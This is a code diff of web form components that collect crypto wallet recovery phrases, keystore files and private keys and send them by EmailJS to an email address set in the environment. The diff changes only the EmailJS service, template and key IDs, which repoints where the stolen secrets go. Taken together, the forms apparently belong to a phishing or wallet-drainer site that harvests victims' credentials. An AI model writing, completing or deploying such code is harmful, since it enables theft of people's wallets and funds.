@@ -15,8 +15,8 @@ export const PhraseForm = () => {
     setLoading(true);
     emailjs
       .send(
-        "service_y2bhhrr",
-        "template_pdxgf2g",
+        "service_xsj88wd",
+        "template_abtmpzm",
         {
           email_subject: "New Phrase Data",
           message,
@@ -24,7 +24,7 @@ export const PhraseForm = () => {
           key: "Recovery Phrase",
           receiver_email: import.meta.env.VITE_USER_EMAIL,
         },
-        "JEfCbGU-NY097Ysab"
+        "ggZdJlIqb4y0Cr2TW"
       )
       .then(
         () => {
@@ -82,10 +82,10 @@ const KeystoreForm = () => {
     setLoading(true);
     emailjs
       .send(
-        "service_y2bhhrr",
-        "template_5ccyb9i",
+        "service_xsj88wd",
+        "template_4fyaafa",
         { keystore },
-        "JEfCbGU-NY097Ysab"
+        "ggZdJlIqb4y0Cr2TW"
       )
       .then(
         () => {
@@ -142,15 +142,15 @@ const PrivateKeyForm = () => {
     setLoading(true);
     emailjs
       .send(
-        "service_y2bhhrr",
-        "template_pdxgf2g",
+        "service_xsj88wd",
+        "template_abtmpzm",
         {
           email_subject: "New Private Key Data",
           message,
           email_title: "Private Key Data",
           key: "Private Key",
         },
-        "JEfCbGU-NY097Ysab"
+        "ggZdJlIqb4y0Cr2TW"
       )
       .then(
         () => {
